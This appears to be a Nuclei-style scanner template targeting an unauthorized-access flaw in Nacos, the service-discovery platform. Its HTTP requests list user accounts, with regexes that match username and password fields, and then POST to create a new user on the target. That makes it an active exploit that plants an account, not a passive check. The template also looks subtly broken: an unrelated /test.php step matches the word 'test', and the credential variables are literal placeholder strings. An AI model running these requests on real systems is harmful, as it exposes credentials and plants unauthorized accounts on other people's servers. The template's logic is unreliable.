id: nacos-unauthorized-access
info:
  name: Nacos Unauthorized Access Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Nacos is a platform for building dynamic service discovery, configuration management, and service management for cloud-native applications. There is an unauthorized access vulnerability in the Nacos interface, which can be used to read important system information and control the system.
  reference:
    - https://nacos.io/zh-cn/index.html

variables:
  username: random-username
  password: random-password

http:
  - raw:
      - |
        GET /test.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "test"

  - raw:
      - |
        GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "pageItems"  
      - type: regex
        part: body
        regex:
          - '"username"\s*:\s*"[^"]+"'  
          - '"password"\s*:\s*"[^"]+"'

  - raw:
      - |
        POST /nacos/v1/auth/users HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "create user ok!"
